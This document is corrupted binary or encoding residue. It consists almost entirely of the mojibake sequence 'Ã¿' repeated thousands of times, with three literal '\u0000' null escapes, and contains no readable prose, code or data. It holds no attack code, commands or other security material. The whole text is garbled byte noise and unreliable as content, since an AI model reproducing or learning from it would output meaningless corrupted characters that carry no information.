¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿